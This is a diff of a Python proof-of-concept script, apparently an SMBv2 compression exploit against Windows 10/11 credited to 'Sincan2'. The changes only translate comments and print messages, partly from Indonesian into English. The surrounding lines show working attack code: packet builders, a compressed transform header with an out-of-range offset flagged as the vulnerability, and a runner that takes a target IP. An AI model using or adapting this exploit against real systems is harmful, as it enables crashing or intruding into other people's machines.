@@ -3,7 +3,7 @@ import socket, struct, sys
 class Smb2Header:
     def __init__(self, command, message_id):
         self.protocol_id = b"\xfeSMB"
-        self.structure_size = b"\x40\x00"  # Harus diset ke 0x40
+        self.structure_size = b"\x40\x00"  # Harus diatur ke 0x40
         self.credit_charge = b"\x00"*2
         self.channel_sequence = b"\x00"*2
         self.channel_reserved = b"\x00"*2
@@ -115,7 +115,7 @@ class Smb2CompressedTransformHeader:
         self.original_decompressed_size = struct.pack('<i', len(self.data))
         self.compression_algorithm = b"\x01\x00"
         self.flags = b"\x00"*2
-        self.offset = b"\xff\xff\xff\xff"  # Kerentanan Sincan2
+        self.offset = b"\xff\xff\xff\xff"  # Sincan2 the vulnerability
 
     def get_packet(self):
         return (
@@ -132,19 +132,19 @@ def send_negotiation(sock):
     packet = NetBIOSWrapper(negotiate.get_packet()).get_packet()
     sock.send(packet)
     response = sock.recv(3000)
-    print(f"Menerima {len(response)} byte dari server")
+    print(f"Received {len(response)} byte dari server")
 
 def send_compressed(sock, data):
     compressed = Smb2CompressedTransformHeader(data)
     packet = NetBIOSWrapper(compressed.get_packet()).get_packet()
     sock.send(packet)
     response = sock.recv(1000)
-    print(f"Menerima {len(response)} byte dari server")
+    print(f"Received {len(response)} byte dari server")
 
 if __name__ == "__main__":
     print("***********************")
     print("*  Sincan2 POC wincok 10-11 *")
-    print("*  Oleh Sincan2         *")
+    print("*  Oleh Sincan2        *")
     print("***********************")
     if len(sys.argv) != 2:
         exit("[-] Penggunaan: {} target_ip".format(sys.argv[0]))
